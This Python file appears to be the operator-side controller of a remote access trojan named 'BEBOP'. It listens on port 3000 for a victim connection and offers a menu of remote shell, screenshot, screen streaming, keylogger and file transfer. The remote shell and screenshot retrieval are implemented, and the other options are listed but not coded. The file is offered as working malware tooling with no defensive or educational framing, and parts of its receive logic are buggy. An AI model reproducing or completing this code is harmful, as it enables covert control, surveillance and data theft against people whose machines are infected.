import socket
import sys
import threading
import time

def print_menu():
    print("\n/-------BEBOP-------/\n")
    print("1.) Open shell")
    print("2.) Take screenshot")
    print("3.) Begin screen stream")
    print("4.) Keylogger")
    print("5.) File upload/download")
    print("6.) Exit\n\n")

def establish_connection():
    global conn_to_client, server
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", 3000))
    server.listen(0)

    print("Waiting on connections")
    conn_to_client, address = server.accept()

    if conn_to_client:
        print(f"Connection to {address[0]}:{address[1]} Established!")
    else:
        sys.exit("Failed to recieve connection to client...Exiting")


def recv():
    return conn_to_client.recv(1024)

def recv_all():
    data_size = int(conn_to_client.recv(8).decode())

    data = bytes()
    data_received_count = 0
    while data_received_count < data_size:
        data = conn_to_client.recv(1024)
        if not data_received_count:
            break
        data_received_count += len(data)

    return data

def send(buffer):
    conn_to_client.send(buffer)

def send_all(data):
    data_size = f"{str(len(data))}\n"
    conn_to_client.send(data_size.encode())
    conn_to_client.sendall(data)

def open_shell():
    while True:
        cmd = input("bebop#: ")
        if not cmd:
            cmd = " "
        elif cmd == "exit":
            send(cmd.encode())
            break

        send(cmd.encode())

        output = recv()
        print(output.decode())


def download_file():
    file_size = int(conn_to_client.recv(8).decode())

    c = 0
    file = open(f"screen_shot_{time.asctime(time.localtime(time.time()))}.png", "wb")
    while c < file_size:
        file_buff = conn_to_client.recv(4096)
        if not file_buff:
            break

        file.write(file_buff)
        c += len(file_buff)

    file.close()

def take_screen_shot():
    file_data = recv_all()
    with open(f"screen_shot_{time.asctime(time.localtime(time.time()))}.png", "wb") as file:
        file.write(file_data)

def main():
    establish_connection()
    while True:
        print_menu()
        choice = input("Enter Choice: ")
        if choice == "1":
            conn_to_client.sendall(b'1')
            open_shell()
        elif choice == "2":
            conn_to_client.sendall(b'2')
            download_file()
        elif choice == "6":
            conn_to_client.sendall(b'6')
            conn_to_client.close()
            sys.exit()

main()
